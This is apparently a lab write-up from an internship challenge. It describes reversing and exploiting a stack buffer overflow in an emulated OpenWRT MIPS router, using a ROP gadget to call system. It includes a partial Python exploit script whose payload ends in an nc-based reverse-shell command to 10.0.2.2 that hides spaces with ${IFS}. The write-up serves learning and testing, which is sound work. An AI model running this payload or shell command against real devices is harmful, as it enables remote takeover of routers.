---
title: 'Reversing and Exploiting a Vulnerable OpenWRT Router'
...
Refer to [setup.md](https://github.com/Archan6el/MIPS-Router-Exploit-RCE-Writeup/blob/main/setup.md) if you want to see some of the setup for this.

For context, this was kindly given to us as an extra challenge as part of a Summer internship program. 

It's an OpenWRT router image that is emulated using QEMU. To aid in debugging, we’re running a GDB server inside the emulated environment and connecting to it from our host machine.
...
Unfortunately no, since `0x0041e720` begins with `00`, it is treated as a null byte, which both messes up the HTTP request and messes up the actual payload due to `strcpy`. 
...
Okay great, we have system, but now we have to give it a parameter. This is actually relatively straight forward since we can basically write whatever we want to the stack due to the buffer overflow, so we can literally just write the parameter we want to use by adding it to our final payload. 
...
Walking through this, it loads a word (4 bytes) at `($sp + 0xa4)` into the `ra` register. It loads a word (or address) at `($s0 + 0xc)` into the register `t9`, and then it jumps, or executes, the function at that address. It also loads a word from memory at a pointer at `s0` into `a0`
...
There is one thing you might be worried about. Does the gadget not load the parameter into `a0` *after* it jumps to / executes the function at `t9`? Or in other words, isn't the parameter not yet ready for the function call?
...
After playing around with the buffer overflow, I find that we can control a whole lot of registers, since they are all loaded from the stack before the segfault. This includes the general registers `s0 - s8`, and naturally since the registers are loaded from the stack, offsets from these registers. With enough trial and error, I find where exactly on the stack the registers get their values from. So we can definitely control what gets placed at `s0` and `s0 + 0xc`. 

So our goal is to place the address of `system` at `s0 + 0xc`, since that gets loaded into `t9`, and then jumped to

We also want to place a pointer to the parameter we want to pass into `system` at `s0`, since that gets loaded into `a0` (`system` takes the pointer to a string of the command, instead of the string itself)

Finally of course, we want to overwrite the return address with the address of our gadget
...
def send_long_path(length, filler, ret_addr):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        ...
        # 0x77fae424 <- SYSTEM
        # 0x7fffdbe0 <- Pointer to reverse shell string
        # 0x7fffdbf4 <- Address of reverse shell string

        # long_path needs to be 176 total in order to overflow
        long_path =  f"{filler}".encode() * (length-32)   # Write enough to get to s0 on stack

        long_path += p32(0x7fffdbe0, endian="big")        # Loads s0 with a pointer to our reverse shell string

        long_path += b"B" * 28                            # Write some more to get to the return address 

        long_path += ret_addr                             # Overwrite return address with gadget

        long_path += p32(0x7fffdbf4, endian="big")        # Address of reverse shell string on stack (this is located at 0x7fffdbe0, hence the ptr val)

        long_path += b"C" * 8                             # Write some more to reach s0 + 0xc

        long_path += p32(0x77fae424, endian="big")        # Loads s0 + 0xc with address of system (which eventually gets moved into t9 via gadget)

        long_path += b"C"*4                               # Write some filler, and then the reverse shell string
        long_path += b"rm${IFS}/tmp/p;mkfifo${IFS}/tmp/p;nc${IFS}10.0.2.2${IFS}9696</tmp/p|/bin/sh>/tmp/p"
...
From the above poc we can see the anatomy of our final payload

First we write some `A's` to reach where `s0` is getting its value from, and then we write `0x7fffdbe0`, which is a pointer to our reverse shell string. In other words, it's the address of where we have written the address of our reverse shell string on the stack. `s0` is now successfully set

We then write a few more bytes to reach the return address, overwriting it with the address of our gadget, which is at `0x77f697a0`. The return address is now successfully set

We then write the address of where our reverse shell string is located on the stack, which is at `0x7fffdbf4`. This address is located at `0x7fffdbe0`, hence the value of the pointer

We write a few more bytes to reach `s0 + 0xc`, and write `0x77fae424`, which is the address of `system`. Via the gadget, this eventually gets loaded into `t9` and jumped to. `s0 + 0xc` is now successfully set

Finally we write 4 more bytes of filler, and then the reverse shell string, which is the parameter we want to pass into `system`

Again, the exact amount of bytes needed to reach the stack locations that are eventually loaded into our desired locations were found through trial and error
